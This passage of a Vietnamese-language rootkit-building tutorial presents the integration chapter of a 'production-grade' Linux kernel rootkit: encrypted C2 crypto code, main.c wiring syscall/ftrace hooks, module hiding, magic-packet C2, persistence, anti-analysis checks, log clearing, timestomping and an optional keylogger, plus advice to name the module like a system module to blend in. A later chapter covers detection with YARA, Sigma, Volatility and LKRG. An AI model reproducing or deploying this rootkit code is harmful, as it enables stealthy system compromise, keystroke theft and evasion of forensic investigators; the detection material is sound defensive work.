    if (!ct_buf) return -ENOMEM;

    /* Copy plaintext vào output buffer (in-place encrypt) */
    memcpy(ct_buf, plaintext, pt_len);

    sg_init_one(&sg_plain, ct_buf, ct_len);

    req = aead_request_alloc(c2_aead_tfm, GFP_KERNEL);
    if (!req) { kfree(ct_buf); return -ENOMEM; }

    aead_request_set_callback(req, CRYPTO_TFM_REQ_MAY_BACKLOG,
                               crypto_req_done, &wait);
    aead_request_set_crypt(req, &sg_plain, &sg_plain,
                            pt_len, nonce);
    aead_request_set_ad(req, 0);

    ret = crypto_wait_req(crypto_aead_encrypt(req), &wait);

    if (ret == 0) {
        /* Build output: [nonce][ciphertext+tag] */
        memcpy(output, nonce, C2_NONCE_SIZE);
        memcpy(output + C2_NONCE_SIZE, ct_buf, ct_len);
        *out_len = C2_NONCE_SIZE + ct_len;
    }

    aead_request_free(req);
    kfree(ct_buf);
    return ret;
}

/* Decrypt + verify authentication tag.
 * Input: [12-byte nonce][ciphertext][16-byte tag]
 * Returns: plaintext_len on success, negative on error/tamper
 */
int rk_aead_decrypt(const void *input, int in_len,
                      void *plaintext, int *pt_len)
{
    struct aead_request *req;
    struct scatterlist sg;
    u8 nonce[C2_NONCE_SIZE];
    u8 *ct_buf;
    int ct_len;
    int ret;
    DECLARE_CRYPTO_WAIT(wait);

    if (!c2_aead_tfm) return -ENODEV;
    if (in_len < C2_NONCE_SIZE + C2_TAG_SIZE) return -EINVAL;

    /* Extract nonce */
    memcpy(nonce, input, C2_NONCE_SIZE);

    ct_len = in_len - C2_NONCE_SIZE;
    ct_buf = kzalloc(ct_len, GFP_KERNEL);
    if (!ct_buf) return -ENOMEM;

    memcpy(ct_buf, input + C2_NONCE_SIZE, ct_len);

    sg_init_one(&sg, ct_buf, ct_len);

    req = aead_request_alloc(c2_aead_tfm, GFP_KERNEL);
    if (!req) { kfree(ct_buf); return -ENOMEM; }

    aead_request_set_callback(req, CRYPTO_TFM_REQ_MAY_BACKLOG,
                               crypto_req_done, &wait);
    aead_request_set_crypt(req, &sg, &sg, ct_len, nonce);
    aead_request_set_ad(req, 0);

    ret = crypto_wait_req(crypto_aead_decrypt(req), &wait);

    if (ret == 0) {
        /* Decryption + auth successful */
        *pt_len = ct_len - C2_TAG_SIZE;
        memcpy(plaintext, ct_buf, *pt_len);
    }
    /* ret == -EBADMSG: authentication failed (tampered!) */

    aead_request_free(req);
    kfree(ct_buf);
    return ret;
}
```

---
## Chapter 15: Tong hop --- Full-featured Rootkit

### 15.0 Module Architecture --- Thiet ke rootkit production-grade

Truoc khi doc code tich hop, can hieu ARCHITECTURE DECISIONS dang sau viec
to chuc mot kernel rootkit phuc tap. Day khong chi la "gop code lai" --- moi
quyet dinh ordering, error handling, va cleanup deu co ly do kernel-level.

#### Module initialization ordering

```
module_init(rk_init)
  <- kernel goi ham nay SAU KHI load module vao memory.

Internals: kernel's do_init_module() goi mod->init() sau khi:
  1. Module ELF da duoc parse va relocate
  2. Symbol dependencies da duoc resolve (EXPORT_SYMBOL)
  3. Module struct da duoc add vao modules list
  4. Notifier chain MODULE_STATE_COMING da fire

rk_init() PHAI init theo thu tu dependency (xem main.c):
  1. Hooking (syscall/ftrace/kprobe) — core capability, fail = abort
     <- Install hooks DAU TIEN de bat dau intercept ngay
     
  2. VFS hooks — supplementary hiding cho directory listing
     <- Can sau syscall hooks (co the depend on cung infrastructure)
     
  3. Network/Netfilter — magic packet, port knock, C2 receive
     <- Can truoc hiding: neu netfilter init fail, module van
        accessible de debug. Non-fatal failure allowed.
     
  4. Hiding — an module khoi lsmod/sysfs
     <- SAU hooks + network: moi feature da active truoc khi an.
        An TRUOC persistence/anti-forensics vi nhung operations
        do co the trigger events (file I/O) — module da hidden
        khi do nen kho trace nguoc.
     
  5. Integrity + Watchdog — self-protection
     <- Can sau hiding (watchdog verify hidden state)
     
  6. Persistence — survive reboot
     <- Can sau hiding (file operations should happen hidden)
     
  7. Anti-forensics — clear dmesg, timestomp
     <- Gan cuoi: xoa moi traces tu cac buoc truoc
     
  8. LSM/Keylogger/Proc/Crypto — optional subsystems
     <- Cuoi cung: optional features, proc = control plane
        chi can hoat dong SAU KHI moi thu da chay

Neu step N fails:
  -> cleanup steps 1..(N-1) theo thu tu NGUOC
  -> return -EINVAL (module se bi unload boi kernel)
  
  Tai sao nguoc? Vi dependency chain:
    Step 3 (hiding) co the depend on step 2 (hooks)
    -> Phai undo step 3 TRUOC khi undo step 2
    -> Nguoc lai se crash (use-after-free, dangling pointers)
```

#### Error handling pattern --- goto cleanup

```c
/*
 * "goto cleanup" pattern --- STANDARD Linux kernel coding style.
 *
 * Tai sao goto ma khong phai nested if/else?
 * - Kernel functions thuong co 5-10 init steps
 * - Nested if/else -> 10 levels of indentation -> unreadable
 * - goto cleanup cho phep LINEAR success path + CLEAR error handling
 *
 * Documentation/process/coding-style.rst, Section 7:
 *   "The goto statement comes in handy when a function exits
 *    from multiple locations and some common work such as cleanup
 *    has to be done."
 *
 * Moi driver, filesystem, va subsystem trong kernel deu dung pattern nay.
 */

int rk_init(void) {
    int ret;
    
    ret = step1_resolve_symbols();
    if (ret)
        goto fail1;    /* Nothing to clean --- just exit */
    
    ret = step2_setup_hooks();
    if (ret)
        goto fail2;    /* Clean step 1 */
    
    ret = step3_hide_module();
    if (ret)
        goto fail3;    /* Clean steps 2, 1 */
    
    ret = step4_init_network();
    if (ret)
        goto fail4;    /* Clean steps 3, 2, 1 */
    
    ret = step5_init_proc();
    if (ret)
        goto fail5;    /* Clean steps 4, 3, 2, 1 */
    
    return 0;          /* Success --- all 5 steps done */

/* Labels in REVERSE order --- each falls through to the next */
fail5: cleanup_step4_network();
fail4: cleanup_step3_unhide();
fail3: cleanup_step2_unhook();
fail2: cleanup_step1_free_symbols();
fail1: return ret;
}

/*
 * Tai sao fall-through hoat dong:
 *   Neu step4 fail -> nhay den fail4
 *   fail4 goi cleanup_step3 -> roi FALL THROUGH den fail3
 *   fail3 goi cleanup_step2 -> roi FALL THROUGH den fail2
 *   fail2 goi cleanup_step1 -> roi FALL THROUGH den fail1
 *   fail1 return error code
 *
 * Ket qua: steps 3, 2, 1 duoc cleanup theo dung thu tu nguoc.
 * Khong can duplicate code, khong can flag variables.
 */
```

#### synchronize_rcu() trong module exit --- tai sao CRITICAL

```
module_exit(rk_exit)

Kernel goi rk_exit() khi rmmod duoc thuc thi.
SAU KHI rk_exit() return, kernel FREE TOAN BO module memory.

rk_exit() PHAI dam bao:
  1. Restore all hooks (put original function pointers back)
     <- Sau buoc nay, NEW calls se di vao original handler
     <- NHUNG: calls da bat dau TRUOC khi restore van dang chay!
     
  2. synchronize_rcu()  <- CRITICAL
     
     RCU (Read-Copy-Update) la synchronization mechanism cua kernel.
     synchronize_rcu() BLOCKS cho den khi tat ca CPUs da di qua
     mot "quiescent state" (context switch, idle, userspace return).
     
     Sau khi synchronize_rcu() return:
       GUARANTEED rang khong con CPU nao dang execute code
       trong module memory region.
     
  3. Bay gio SAFE de free module memory (rmmod returns)

Khong co synchronize_rcu() --- race condition:

  Timeline:
  --------
  CPU 0                          CPU 1
  -----                          -----
  rmmod: restore hook pointers
  rmmod: rk_exit() returns
  kernel: free module memory     syscall -> old hook entry
    (pages unmapped)             ... still executing hook code ...
                                 -> PAGE FAULT -> kernel panic!
                                 
  Day la use-after-free trong kernel space:
    - Best case: kernel oops + crash
    - Worst case: silent memory corruption -> data loss
    
  synchronize_rcu() la BARRIER:
  
  CPU 0                          CPU 1
  -----                          -----
  rmmod: restore hook pointers
  synchronize_rcu() -> WAIT      syscall -> hook (original now)
    |                            ... executing ...
    |                            ... returns to userspace ...
    |<--- quiescent state -------+
  synchronize_rcu() returns
  kernel: safe to free memory
  
Alternatives (va tai sao chung kem hon):
  - msleep(1000): "hope no one is still in the hook"
    -> Khong co guarantee. Co the KHONG DU tren busy system.
    -> Co the QUA NHIEU tren idle system (waste time).
    -> msleep is a PRAYER, not a BARRIER.
    
  - synchronize_rcu(): mathematically proven correct
    -> Waits EXACTLY as long as needed
    -> Based on kernel scheduler state, not time
```

#### Testing methodology

```
Development setup --- KHONG BAO GIO test rootkit tren host machine:

  QEMU + GDB --- gold standard cho kernel dev:
  
    # Start VM with debug support
    qemu-system-x86_64 \
      -kernel vmlinuz \           # Kernel image
      -initrd initramfs.img \     # Minimal filesystem
      -append "console=ttyS0 nokaslr" \  # nokaslr = fixed addresses
      -nographic \                # Console output to terminal
      -s \                        # GDB server on :1234
      -S                          # Freeze CPU at startup (wait for GDB)
    
    # In another terminal
    gdb vmlinux                   # Kernel with debug symbols
    (gdb) target remote :1234     # Connect to QEMU
    (gdb) break rk_init           # Breakpoint at module init
    (gdb) continue                # Let kernel boot
    
    # After insmod in VM, GDB hits breakpoint
    (gdb) step                    # Step through rootkit code
    (gdb) print hidden_pid_count  # Inspect variables
    (gdb) x/10i $rip              # Disassemble current instruction

  Useful kernel debug options (enable in .config):
  
    CONFIG_DEBUG_INFO=y
      -> Compile with -g, generate DWARF debug info
      -> GDB can show source code, variable names, struct layouts
      -> ESSENTIAL cho kernel debugging
      
    CONFIG_KASAN=y    (Kernel Address SANitizer)
      -> Instruments memory access at compile time
      -> Detects: use-after-free, out-of-bounds, double-free
      -> Overhead: ~2x memory, ~2x CPU
      -> KASAN se bat use-after-free neu synchronize_rcu() bi thieu
      
    CONFIG_LOCKDEP=y  (Lock DEPendency validator)
      -> Runtime lock ordering validation
      -> Detects: ABBA deadlocks, lock inversion, recursive locks
      -> Se bat loi neu add_hidden_pid() goi is_pid_hidden()
         (recursive spinlock acquisition -> deadlock)
      
    CONFIG_DEBUG_LIST=y
      -> Validates linked list operations at runtime
      -> list_add() vao corrupted list -> immediate warning
      -> Catches list_del() bugs in DKOM hiding
      
    CONFIG_FTRACE=y   (Function TRACing)
      -> Per-function call tracing
      -> trace-cmd record -p function -l 'sys_getdents*'
      -> Xem CHINH XAC ham nao duoc goi, bao nhieu lan, mat bao lau
      
    CONFIG_PROVE_RCU=y
      -> Validate RCU usage patterns
      -> Detect: sleeping in RCU read-side critical section
      -> Detect: missing rcu_read_lock/unlock pairs

  Snapshot workflow:
    1. Boot clean VM -> take snapshot "clean"
    2. insmod rootkit -> test -> observe
    3. Revert to "clean" snapshot
    4. Repeat
    
    -> Khong bao gio bi "brick" VM
    -> Moi test bat dau tu trang thai sach
```

---

### main.c --- Entry point tich hop tat ca components

```c
/* main.c --- PHIEN BAN HOAN CHINH
 *
 * Tich hop TAT CA subsystems:
 *   hooks, VFS, netfilter, persistence, watchdog,
 *   anti-forensics, environment check, code integrity,
 *   /proc control interface, encrypted C2 crypto.
 *
 * Chon hooking method tai compile time qua define:
 *   -DUSE_FTRACE    -> Ftrace-based (recommended cho kernel >= 5.x)
 *   -DUSE_KPROBE    -> Kprobe-based
 *   -DUSE_SYSCALL   -> Syscall table (classic)
 *   Default          -> Auto-detect best method
 */

#include "rootkit.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("research");
MODULE_DESCRIPTION("Kernel Research Module");

/* Ten module --- dat giong system module de blend in.
 * Vi du ten tot: "kworker", "rcu_tasks", "scsi_mod",
 *                 "nf_conntrack", "overlay"
 * Avoid: "rootkit", "backdoor", "hack" */

static int __init rk_init(void)
{
    int err;
    bool safe;

    /* 0. Environment check --- VM/container/analysis tools */
    safe = rk_environment_safe();
    if (!safe) {
        /* Analysis tools detected --- load nhung gioi han features.
         * Khong exit (do la indicator). Chi passive mode. */
        pr_info("rk: passive mode (analysis environment)\n");
    }

    /* 1. Install hooks */
#if defined(USE_FTRACE)
    err = rk_ftrace_install();
#elif defined(USE_KPROBE)
    err = rk_kprobe_install();
#else
    err = rk_install_hooks();
#endif
    if (err) {
        pr_err("rk: hook installation failed: %d\n", err);
        return err;
    }

    /* 2. VFS hooks (supplementary hiding) */
    rk_vfs_hook_install();

    /* 3. Netfilter (magic packet, port knock) */
    err = rk_net_init();
    if (err)
        pr_warn("rk: netfilter init failed (non-fatal)\n");

    /* 4. An module */
    rk_hide_module();

    /* 5. Code integrity baseline (hash code pages) */
    rk_integrity_init();

    /* 6. Watchdog thread (self-protection) */
    if (safe)
        rk_start_watchdog();

    /* 7. Persistence (only neu khong phai analysis environment) */
    if (safe)
        rk_install_persistence();

    /* 8. Anti-forensics: clear traces */
    rk_clear_dmesg();
    rk_timestomp_rootkit_files();

    /* 9. LSM hooks (optional, neu compiled voi LSM support) */
#ifdef USE_LSM
    rk_lsm_install();
#endif

    /* 10. Keylogger (optional) */
#ifdef USE_KEYLOGGER
    register_keyboard_notifier(&rk_kb_nb);
#endif

    /* 11. /proc control interface */
    rk_proc_init();

    /* 12. Encrypted C2 crypto init */
    rk_crypto_init();

    pr_info("rk: fully operational\n");
    return 0;
}

static void __exit rk_exit(void)
{
    /* Cleanup nguoc thu tu init */

    /* Show module truoc de rmmod hoat dong dung.
     * Module da bi list_del() trong rk_hide_module() — neu khong
     * restore thi rmmod cua hidden module se unpredictable. */
    rk_show_module();

    rk_crypto_cleanup();
    rk_proc_cleanup();

#ifdef USE_KEYLOGGER
    unregister_keyboard_notifier(&rk_kb_nb);
#endif

#ifdef USE_LSM
    rk_lsm_remove();
#endif

    rk_stop_watchdog();
    rk_net_cleanup();
    rk_vfs_hook_remove();

#if defined(USE_FTRACE)
    rk_ftrace_remove();
#elif defined(USE_KPROBE)
    rk_kprobe_remove();
#else
    rk_remove_hooks();
#endif

    /* Synchronize: doi in-flight handlers hoan thanh.
     * synchronize_rcu() waits for all CPUs to pass through
     * a quiescent state. After return, GUARANTEED that no CPU
     * is executing in the old hook functions.
     *
     * This is the CORRECT way to ensure in-flight handlers complete
     * before module memory is freed. msleep is a prayer, not a barrier. */
    synchronize_rcu();

    pr_info("rk: cleanup complete\n");
}

module_init(rk_init);
module_exit(rk_exit);
```

### util.c --- Utility functions (deadlock-safe PID management)

```c
/* util.c --- Shared utilities cho rootkit subsystems
 *
 * Hidden PID management: track PIDs to hide from ps/top.
 * All functions phai thread-safe (kernel spinlock).
 */

#include "rootkit.h"

#define MAX_HIDDEN_PIDS 256

static pid_t hidden_pids[MAX_HIDDEN_PIDS];
static int   hidden_pid_count = 0;
static DEFINE_SPINLOCK(pid_lock);

/* Check if PID is in hidden list */
bool is_pid_hidden(pid_t pid)
{
    int i;
    bool found = false;

    spin_lock(&pid_lock);
    for (i = 0; i < hidden_pid_count; i++) {
        if (hidden_pids[i] == pid) {
            found = true;
            break;
        }
    }
    spin_unlock(&pid_lock);

    return found;
}

/* Add PID to hidden list.
 *
 * CRITICAL: Do NOT call is_pid_hidden() here.
 * is_pid_hidden() acquires pid_lock -> calling it while
 * already holding pid_lock = DEADLOCK (kernel spinlocks
 * are non-recursive). Instead, inline the duplicate check
 * directly inside the critical section. */
void add_hidden_pid(pid_t pid)
{
    int i;
    bool already = false;

    spin_lock(&pid_lock);

    /* Inline check --- DON'T call is_pid_hidden (it locks too) */
    for (i = 0; i < hidden_pid_count; i++) {
        if (hidden_pids[i] == pid) {
            already = true;
            break;
        }
    }

    if (!already && hidden_pid_count < MAX_HIDDEN_PIDS)
        hidden_pids[hidden_pid_count++] = pid;

    spin_unlock(&pid_lock);
}

void remove_hidden_pid(pid_t pid)
{
    int i;

    spin_lock(&pid_lock);
    for (i = 0; i < hidden_pid_count; i++) {
        if (hidden_pids[i] == pid) {
            hidden_pids[i] = hidden_pids[--hidden_pid_count];
            break;
        }
    }
    spin_unlock(&pid_lock);
}

/* Accessor function cho hidden_pid_count.
 *
 * hidden_pid_count is static in util.c but /proc read handler
 * in proc_interface.c needs it. Direct access -> linker error.
 * Accessor function: declared in rootkit.h, defined here. */
int rk_get_hidden_pid_count(void)
{
    int count;
    spin_lock(&pid_lock);
    count = hidden_pid_count;
    spin_unlock(&pid_lock);
    return count;
}
```

### rootkit.h --- Header declarations (relevant additions)

```c
/* rootkit.h --- Full declarations cho tat ca subsystems */

/* ... (existing declarations tu Section 1.2) ... */

/* Kernel 6.4+ compat: core_layout removed */
#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 4, 0)
  #define MOD_BASE(m) ((m)->mem[MOD_TEXT].base)
  #define MOD_SIZE(m) ((m)->mem[MOD_TEXT].size)
#else
  #define MOD_BASE(m) ((m)->core_layout.base)
  #define MOD_SIZE(m) ((m)->core_layout.size)
#endif

/* proc_interface.c */
int  rk_proc_init(void);
void rk_proc_cleanup(void);

/* encrypted_c2.c / crypto */
int  rk_crypto_init(void);
void rk_crypto_cleanup(void);
int  rk_aead_encrypt(const void *plaintext, int pt_len,
                      void *output, int *out_len);
int  rk_aead_decrypt(const void *input, int in_len,
                      void *plaintext, int *pt_len);

/* util.c --- PID management */
bool is_pid_hidden(pid_t pid);
void add_hidden_pid(pid_t pid);
void remove_hidden_pid(pid_t pid);
int  rk_get_hidden_pid_count(void);

/* anti_forensics.c */
bool rk_environment_safe(void);
void rk_start_watchdog(void);
void rk_stop_watchdog(void);
void rk_clear_dmesg(void);
void rk_timestomp_rootkit_files(void);
bool rk_integrity_check(void);

/* ftrace_hooks.c */
int  rk_ftrace_install(void);
void rk_ftrace_remove(void);

/* kprobe_hooks.c */
int  rk_kprobe_install(void);
void rk_kprobe_remove(void);

/* vfs_hooks.c */
void rk_vfs_hook_install(void);
void rk_vfs_hook_remove(void);

/* integrity.c */
void rk_integrity_init(void);

/* lsm_hooks.c */
int  rk_lsm_install(void);
void rk_lsm_remove(void);

/* persistence.c */
void rk_install_persistence(void);
```

### Makefile

```makefile
# Makefile cho full-featured rootkit
MODULE_NAME := rk

obj-m := $(MODULE_NAME).o
$(MODULE_NAME)-objs := main.o syscall_hooks.o ftrace_hooks.o \
                        kprobe_hooks.o vfs_hooks.o net_hooks.o \
                        dkom.o inline_hook.o util.o persistence.o \
                        anti_forensics.o covert_channel.o \
                        proc_interface.o encrypted_c2.o \
                        keylogger.o lsm_hooks.o integrity.o

KDIR ?= /lib/modules/$(shell uname -r)/build
PWD  := $(shell pwd)

# Chon hooking method (uncomment 1):
# ccflags-y += -DUSE_FTRACE
# ccflags-y += -DUSE_KPROBE
# ccflags-y += -DUSE_SYSCALL

# Optional features:
# ccflags-y += -DUSE_LSM
# ccflags-y += -DUSE_KEYLOGGER

all:
	$(MAKE) -C $(KDIR) M=$(PWD) modules

clean:
	$(MAKE) -C $(KDIR) M=$(PWD) clean
```

---

## Chapter 16: Detection Engineering

### 16.0 Detection Theory --- Tu duy defender

Sau khi xay dung rootkit, phai HIEU CACH DETECT chinh no.
Day la su khac biet giua "script kiddie copy code" va "security researcher":
  - Attacker chi can 1 technique hoat dong
  - Defender phai detect TAT CA techniques
  - Researcher hieu CA HAI phia

#### Ba truong phai detection

```
1. INTEGRITY CHECKING --- so sanh state hien tai vs known-good baseline

   Nguyen ly: rootkit PHAI modify kernel state de hoat dong.
   Neu ta co baseline cua state "sach", moi thay doi = indicator.
   
   Syscall table integrity:
     Baseline: luu dia chi cua moi syscall entry tu kallsyms khi boot
     Runtime:  doc lai syscall table entries
     So sanh:  entry[i] != baseline[i] -> syscall bi hook
     
     Chi tiet: moi entry trong sys_call_table PHAI tro vao
     kernel text section [_stext, _etext]. Neu mot entry
     tro ra ngoai range nay -> tro vao module memory -> HOOK.
   
   Function prologue integrity:
     Baseline: save first 16 bytes cua moi critical function
     Runtime:  doc lai first 16 bytes
     So sanh:  bytes khac -> inline hook da duoc install
     
     Pattern can detect:
       48 B8 xx xx xx xx xx xx xx xx   MOV RAX, <address>
       FF E0                           JMP RAX
     -> Day la trampoline cua inline hook
   
   Module list integrity:
     Baseline: list_head cua modules list
     Runtime:  walk list, count modules
     Cross-check: scan memory cho module_struct signatures
     So sanh:  module trong memory nhung KHONG trong list
               -> DKOM hidden module

2. BEHAVIORAL ANALYSIS --- detect hanh vi bat thuong (khong can baseline)

   Nguyen ly: rootkit AN thong tin, tao INCONSISTENCY giua
   cac nguon thong tin khac nhau trong cung mot system.
   
   Hidden process detection:
     /proc listing:      PID 1234 KHONG xuat hien
     Scheduler run queue: PID 1234 CO trong scheduler
     -> Process exists nhung bi an khoi /proc -> rootkit
     
     Ky thuat: for_each_process() macro walk task_struct list
     truc tiep, bypass getdents64 hook cua rootkit.
   
   Hidden network connection:
     ss/netstat output:     connection KHONG xuat hien
     /proc/net/tcp raw:     connection CO (neu rootkit chi hook userspace tool)
     Kernel sock list:      connection CO (neu check truc tiep)
     -> Connection exists nhung bi an -> rootkit
   
   Hidden file detection:
     ls / readdir output:   file KHONG xuat hien
     stat() direct:         file EXISTS (stat tra ve success)
     Inode scan:            file CO tren disk
     -> File exists nhung bi an khoi directory listing -> rootkit

3. MEMORY FORENSICS --- offline analysis cua memory dump

   Nguyen ly: rootkit AN thong tin khoi running OS,
   nhung KHONG THE an khoi physical memory.
   Dump memory -> analyze offline -> thay EVERYTHING.
   
   LiME (Linux Memory Extractor):
     Kernel module duoc insmod vao running system
     Doc TOAN BO physical pages (tung page frame)
     Ghi ra file hoac gui qua network
     
     Luu y: LiME chinh no la mot kernel module
     -> Rootkit co the detect va block insmod
     -> Alternative: /dev/mem, /dev/crash, firewire DMA
   
   Volatility framework: analyze memory dump offline
     Reconstruct kernel objects tu raw memory
     Tim TAT CA objects, ke ca nhung thu bi "hidden"
     
     Vi sao hoat dong: rootkit chi unlink objects khoi LISTS
     Nhung object van TON TAI trong memory
     Volatility scan memory tim struct signatures
     -> Tim duoc objects ma OS "khong thay"
```

#### Memory forensics voi Volatility3 --- kien truc va workflow

```
Memory acquisition pipeline:

  Running System
       |
       v
  LiME module insmod
       |
       | doc physical pages: for each PFN (Page Frame Number):
       |   page = pfn_to_page(pfn)
       |   content = kmap(page) -> read 4096 bytes -> kunmap
       |   write to output
       |
       v
  Raw memory file (memdump.raw)
       |
       v
  Volatility3 analysis

Volatility3 architecture --- 3 layers:

  Layer 1: Physical Memory Layer
    Input: raw file, ELF core, LiME format, firewire capture
    Cung cap: read(physical_address, size) -> bytes
    Khong biet gi ve virtual memory hay kernel objects
    
  Layer 2: Virtual Memory Layer (Intel AMD64 paging)
    Su dung page tables tu Layer 1 de translate:
      Virtual address -> Physical address
    
    4-level paging (x86_64):
      PML4 (Page Map Level 4) -> 512 entries, 9 bits
      PDPT (Page Directory Pointer Table) -> 9 bits  
      PD   (Page Directory) -> 9 bits
      PT   (Page Table) -> 9 bits
      Offset -> 12 bits
      
      Virtual addr: [PML4][PDPT][PD][PT][Offset]
      CR3 register -> PML4 physical address
      
    Volatility doc CR3 tu KPTI tables hoac idle task
    -> Co the translate BAT KY virtual address
    
  Layer 3: Object Layer (kernel struct reconstruction)
    Su dung debug symbols (DWARF / System.map) de:
      - Biet struct layout (field offsets, sizes)
      - Biet global variable addresses
      - Reconstruct linked lists, trees, hash tables
    
    Vi du: doc modules list
      1. Tim symbol "modules" -> dia chi cua list_head
      2. Follow list_head.next pointers
      3. container_of() de tim module_struct tu list_head
      4. Doc module_struct fields: name, size, base address

  Plugin workflow:
    Plugin -> doc Layer 3 objects (structured kernel data)
           -> so sanh voi nhung gi OS reports
    
    Discrepancy = rootkit indicator
    
    Vi du: linux.hidden_modules plugin
      Step 1: Walk modules list (nhu OS lam) -> Set A
      Step 2: Scan memory cho module_struct signatures -> Set B
      Step 3: B - A = hidden modules
      
      Rootkit dung list_del() chi remove khoi list (Step 1)
      Nhung module_struct van nam trong memory (Step 2 tim thay)
```

#### LKRG (Linux Kernel Runtime Guard) --- runtime defense

```
LKRG la kernel module hoat dong nhu "immune system" cua kernel.
Thay vi scan tu ben ngoai (nhu Volatility), LKRG MONITOR tu ben trong,
TRONG KHI SYSTEM DANG CHAY.

LKRG monitors (lien tuc tai runtime):

  1. Syscall table integrity
     - Periodic hash check cua toan bo sys_call_table
     - Luu hash khi LKRG load (baseline)
     - Timer fires -> recompute hash -> compare
     - Mismatch -> ALERT: syscall table da bi modify
     
  2. IDT (Interrupt Descriptor Table) integrity
     - IDT chua handlers cho interrupts va exceptions
     - Rootkit co the hook interrupt handlers
     - LKRG hash IDT entries -> periodic verify
     
  3. Kernel text section integrity
     - .text section chua compiled kernel code
     - Inline hooks MODIFY bytes trong .text
     - LKRG hash kernel text pages -> detect modification
     - Luu y: kernel co "text_poke" cho legitimate patching
       LKRG phai distinguish legitimate vs malicious changes
     
  4. Module list integrity
     - Monitor modules list cho unauthorized changes
     - Detect: module bi remove khoi list nhung van trong memory
     - Cross-reference voi memory layout
     
  5. Credentials integrity
     - Hook security-sensitive functions (commit_creds, etc.)
     - Monitor task_struct->cred cho unauthorized changes
     - Detect: uid suddenly thay doi tu 1000 -> 0
       ma KHONG thong qua legitimate path (su_do, setuid)
     -> Nay detect privilege escalation rootkit!
     
  6. SELinux/capability integrity
     - Monitor security context changes
     - Detect bypass cua mandatory access control

  LKRG response options:
    - Log only (detection mode)
    - Kill offending process
    - Kernel panic (nuclear option --- prevent further damage)

  Rootkit vs LKRG --- attacker phai:
    1. Hook syscalls MA KHONG modify sys_call_table (dung ftrace/kprobe)
    2. Hide module MA KHONG break LKRG's module monitoring
    3. Escalate privileges MA KHONG trigger credential monitoring
    4. Modify kernel code MA KHONG trigger text integrity check
    5. Lam TAT CA dieu tren DONG THOI
    
    -> Do kho tang DRAMATICALLY khi LKRG active
    -> Day la ly do defense-in-depth hoat dong:
       moi layer KHONG CAN perfect, chi can TANG COST cho attacker
```

---

```bash
# ===============================================================
# Sau khi viet rootkit, VIET DETECTION cho chinh no.
# Day la cach tro thanh security researcher thuc su:
# attack + defense = complete understanding.
# ===============================================================

# -- 1. YARA Rule --
# Detect rootkit binary (.ko file) tren disk

cat > rootkit_detector.yar << 'YARA'
rule Linux_Rootkit_Generic {
    meta:
        description = "Detect LKM rootkit patterns"
        author = "research"
    
    strings:
        $s1 = "sys_call_table" ascii
        $s2 = "prepare_creds" ascii
        $s3 = "commit_creds" ascii
        $s4 = "list_del" ascii
        $s5 = "__x64_sys_getdents64" ascii
        $s6 = "kobject_del" ascii
        
        $magic1 = { DE AD 13 37 }
        $magic2 = "MAGIC_SIGNAL" ascii
        
        $hide1 = "hide_module" ascii
        $hide2 = "hidden_pid" ascii
        
    condition:
        uint32(0) == 0x464c457f and  // ELF magic
        (3 of ($s*)) and
        (1 of ($hide*) or 1 of ($magic*))
}
YARA

# Scan: yara rootkit_detector.yar /lib/modules/$(uname -r)/

# -- 2. Volatile Checks (runtime) --

# Check syscall table integrity
# Moi entry phai tro vao kernel text section [_stext, _etext]
cat /proc/kallsyms | grep -E "^[0-9a-f]+ T _stext"
cat /proc/kallsyms | grep -E "^[0-9a-f]+ T _etext"
# So sanh voi: cat /proc/kallsyms | grep sys_call_table
# Dump entries va verify range

# Check hidden modules
# Method: so sanh /proc/modules voi /sys/module/
diff <(cat /proc/modules | awk '{print $1}' | sort) \
     <(ls /sys/module/ | sort)
# Mismatch = hidden module hoac built-in module

# Check ftrace hooks
cat /sys/kernel/debug/tracing/enabled_functions
cat /sys/kernel/debug/tracing/set_ftrace_filter
# Unexpected entries = potential rootkit

# Check kprobes
cat /sys/kernel/debug/kprobes/list
# Unexpected probes tren sys_* functions = suspicious

# Check eBPF programs  
bpftool prog list
bpftool map list
# Unexpected programs, dac biet kprobe/tracepoint type = suspicious

# -- 3. Memory Forensics (LiME + Volatility) --

# Dump memory
sudo insmod lime.ko "path=/tmp/memdump.raw format=raw"

# Analyze voi Volatility 3
vol3 -f /tmp/memdump.raw linux.lsmod.Lsmod
vol3 -f /tmp/memdump.raw linux.check_syscall.Check_syscall
vol3 -f /tmp/memdump.raw linux.hidden_modules.Hidden_modules
vol3 -f /tmp/memdump.raw linux.check_idt.Check_idt

# -- 4. Sigma Rule (cho SIEM) --
cat > rootkit_detect.yml << 'SIGMA'
title: Suspicious Kernel Module Load
status: experimental
logsource:
    product: linux
    service: syslog
detection:
    selection:
        - CommandLine|contains:
            - 'insmod'
            - 'modprobe'
        - EventType: 'module_load'
    filter:
        ModuleName|endswith:
            - '.ko'
        ModuleSigned: true
    condition: selection and not filter
level: high
SIGMA

# -- 5. LKRG (Linux Kernel Runtime Guard) --
# Install va configure LKRG cho runtime integrity monitoring
# LKRG detect: syscall table modifications, credential changes,
# module hiding, va nhieu rootkit indicators khac.
# https://lkrg.org/
```

### Volatility3 Custom Plugin --- Detect Rootkit Indicators

```python
# volatility3 plugin: detect_rootkit.py
#
# Detect common LKM rootkit indicators:
#   - Hooked syscall entries (handler outside kernel text)
#   - Inline hooks (MOV RAX + JMP RAX at function entry)
#   - DKOM hidden modules (in memory but not in list)
#
# Install: copy to volatility3/framework/plugins/linux/
# Usage: vol3 -f memory.dump linux.detect_rootkit.DetectRootkit

from volatility3.framework import interfaces, renderers
from volatility3.framework.configuration import requirements
from volatility3.plugins.linux import lsmod, check_syscall

class DetectRootkit(interfaces.plugins.PluginInterface):
    """Detect common LKM rootkit indicators."""

    _required_framework_version = (2, 0, 0)

    @classmethod
    def get_requirements(cls):
        return [
            requirements.TranslationLayerRequirement(
                name="primary",
                architectures=["Intel64"]),
            requirements.SymbolTableRequirement(
                name="vmlinux",
                description="Linux kernel symbol table"),
        ]

    def _generator(self):
        vmlinux = self.context.modules[self.config["vmlinux"]]
        layer = self.context.layers[self.config["primary"]]

        # Check 1: Hidden modules (in memory but not in list)
        # Walk kernel memory for module_struct signatures
        # not present in the modules list
        modules_list = set()
        for mod in lsmod.Lsmod.list_modules(
                self.context, vmlinux.name):
            modules_list.add(mod.name)

        # Check 2: Hooked syscall entries
        # Compare syscall table entries against known kernel text range
        sct_addr = vmlinux.object_from_symbol("sys_call_table")
        kernel_start = vmlinux.object_from_symbol("_stext").vol.offset
        kernel_end = vmlinux.object_from_symbol("_etext").vol.offset

        suspicious_syscalls = []
        for i in range(512):
            try:
                entry = sct_addr[i]
